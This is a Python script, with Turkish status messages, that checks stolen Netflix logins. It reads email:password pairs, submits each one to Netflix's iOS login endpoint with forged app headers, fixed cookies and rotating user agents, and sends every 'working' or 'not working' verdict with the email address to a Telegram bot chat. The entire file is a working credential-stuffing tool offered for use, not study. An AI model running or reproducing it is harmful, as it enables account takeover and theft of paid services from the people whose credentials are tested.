import requests
from user_agent import generate_user_agent
import time

# Telegram Bot details
tok = input("Telegram Bot Token: ")
ID = input("Chat ID: ")

# Define the URL for Telegram API
telegram_url = f"https://api.telegram.org/bot{tok}/sendMessage"

# Function to send messages to Telegram
def send_telegram_message(message):
    payload = {
        'chat_id': ID,
        'text': message
    }
    response = requests.post(telegram_url, data=payload)
    return response.status_code

# Loop to continuously ask for email:password pairs
while True:
    # Prompt user to input email:password
    input_data = input("Enter email:password (or type 'exit' to quit): ")

    if input_data.lower() == 'exit':
        break

    try:
        # Split the input into email and password
        ema, password = input_data.split(':')

        # Extract email and domain for later use
        email = ema.split("@")[0]
        domn = ema.split("@")[1]

        url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'

        headers = {
            "Host": "ios.prod.http1.netflix.com",
            "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTUJFRByx7mBt57rvfLcA4fGVtD2MjzstsmzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TUJFRByx7mBt57rvfLcA4fGVtD2MjzstsmKbizWrz0uHkFoHMVbhNYl",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Netflix.argo.abtests": "",
            "X-Netflix.client.appversion": "10.19.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "tr-TR;q=1, en-US;q=0.9",
            "Content-Length": "1851",
            "X-Netflix.client.idiom": "phone",
            "User-Agent": generate_user_agent(),
            "X-Netflix.client.type": "argo",
            "X-Netflix.nfnsm": "9",
            "Connection": "close"
        }

        data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%7D&loginType=email&password={password}&email={ema}&phone=&rememberMe=false'

        # Send the request
        response = requests.post(url, headers=headers, data=data)
        status_code = response.status_code

        if status_code == 200:
            message = f"Netflix {ema} hesabı çalışıyor..."
            print(message)
            send_telegram_message(message)
        elif status_code == 400:
            message = f"Netflix {ema} hesabı çalışmıyor..."
            print(message)
            send_telegram_message(message)
        else:
            message = "Beklenmeyen bir hata meydana geldi"
            print(message)
            send_telegram_message(message)
    except ValueError:
        print("Hatalı giriş formatı. Lütfen 'email:password' formatında girin.")
        continue
    except Exception as e:
        message = f"Hata oluştu: {e}"
        print(message)
        send_telegram_message(message)

    time.sleep(0.5)  # Sleep for a short time before continuing
